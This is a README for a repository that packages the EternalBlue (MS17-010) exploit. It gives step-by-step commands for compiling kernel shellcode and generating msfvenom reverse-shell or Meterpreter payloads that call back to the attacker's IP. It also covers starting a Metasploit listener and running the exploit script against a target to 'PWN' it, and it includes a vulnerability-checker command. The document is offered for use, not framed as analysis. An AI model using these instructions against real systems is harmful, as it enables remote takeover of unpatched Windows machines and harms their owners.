# MS17-010-S6r (ETERNAL BLUE) Exploit Code

This is some no-bs public exploit code that generates valid shellcode for the eternal blue exploit and scripts out the event listener with the metasploit multi-handler.

This version of the exploit is prepared in a way where you can exploit eternal blue WITHOUT metasploit. Your options for auto shell generation are to generate shellcode with msfvenom that has meterpreter (i.e. with metasploit) or to generate a normal windows cmd shell (i.e. without metasploit). Alternatively you can elect to brew in your own shellcode.

This allows for this version of the MS17-010 exploit to be a bit more flexible, and also fully functional, as many exploits leave out the steps to compile the kernel shellcode that usually comes with it.

Included is also an enternal blue checker script that allows you to test if your target is potentially vulnerable to MS17-010

run `python eternalblue_checker.py <TARGET-IP>`

## VIDEO TUTORIAL:
https://www.youtube.com/watch?v=p9OnxS1oDc0

## USAGE:
Navigate to the `shellcode` directory in the repo:

run `./shell_prep.sh`

Follow the prompts, for example:
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
    "S6r".'-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64_meterpreter kernel shellcode
Compiling x86_meterpreter kernel shellcode
Compiling x64_shell kernel shellcode
Compiling x86_shell kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
y
IP for reverse connection:
<YOUR-IP>
PORT meterpreter you want x64 to listen on:
<SOME PORT>
PORT meterpreter you want x86 to listen on:
<SOME OTHER PORT>
PORT shell you want x64 to listen on:
<SOME OTHER PORT>
PORT shell you want x86 to listen on:
<SOME OTHER PORT>
Enter 0 for meterpreter shell or 1 for regular cmd shell or 2 meterpreter and shell
0
```

After the script finishes there will be a shellcode binary named `sc_all_mpr.bin` sc_all_shl.bin ` in the shellcode directory


Next, navigate to the main repo directory:

run `listener_prep.sh`

Follow the propmts, for example:
  __
  /,-
  ||)
  \\_, )
   `--'--"S6R"
Enternal Blue Metasploit Listener

IP for reverse connection:
<YOUR-IP>
PORT for x64 reverse connection meterpreter:
<SOME PORT>
PORT for x86 reverse connection meterpreter::
<SOME OTHER PORT>
PORT for x64 reverse connection shell:
<OME OTHER PORT>
PORT for x86 reverse connection shell:
<SOME OTHER PORT>
Enter 0 for meterpreter shell or 1 for regular cmd shell or 2 meterpreter and shell:
0,1,2
Starting listener...
```

## PWN:
If you have completed the USAGE steps, now you're ready to PWN the target.

run `python eternalblue_exploit7.py <TARGET-IP> <PATH/TO/SHELLCODE/sc_all_mpr.bin or sc_all_shl.bin >`

This has only been tested on Windows 7/Server 2008, however the exploit included in this repo also includes the Windows 8 version and *should* work.


The original exploit code that this repo pulls from is located here: https://github.com/worawit/MS17-010
